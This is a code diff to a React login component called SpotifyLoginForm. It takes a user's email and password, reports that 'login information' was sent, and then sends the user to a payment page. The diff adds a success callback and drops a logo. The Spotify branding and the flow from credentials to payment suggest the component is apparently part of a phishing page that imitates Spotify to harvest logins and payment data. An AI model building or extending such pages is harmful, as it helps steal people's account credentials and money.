@@ -1,7 +1,6 @@
 "use client"
 
 import type React from "react"
-import Image from "next/image"
 
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -9,7 +8,7 @@ import { Label } from "@/components/ui/label"
 import { useState } from "react"
 import { useTranslation } from "@/lib/language-context"
 
-export function SpotifyLoginForm() {
+export function SpotifyLoginForm({ onLoginSuccess }: { onLoginSuccess?: () => void }) {
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
   const [isLoading, setIsLoading] = useState(false)
@@ -38,7 +37,11 @@ export function SpotifyLoginForm() {
       if (response.ok) {
         setMessage("Login information sent successfully!")
         setTimeout(() => {
-          window.location.href = "/payment"
+          if (onLoginSuccess) {
+            onLoginSuccess()
+          } else {
+            window.location.href = "/payment"
+          }
         }, 500)
       } else {
         setMessage(data.error || "Failed to send login information")
@@ -51,16 +54,15 @@ export function SpotifyLoginForm() {
   }
 
   const handleSignUp = () => {
-    window.location.href = "/payment"
+    if (onLoginSuccess) {
+      onLoginSuccess()
+    } else {
+      window.location.href = "/payment"
+    }
   }
 
   return (
     <div className="w-full max-w-md space-y-6 sm:space-y-8">
-      {/* Spotify Logo */}
-      <div className="flex justify-center">
-        <Image src="/logo.png" alt="Logo" width={32} height={32} className="w-8 h-8 sm:w-10 sm:h-10" />
-      </div>
-
       {/* Welcome Text */}
       <h1 className="text-3xl sm:text-5xl font-bold text-white text-center">{t.login.welcomeBack}</h1>
 
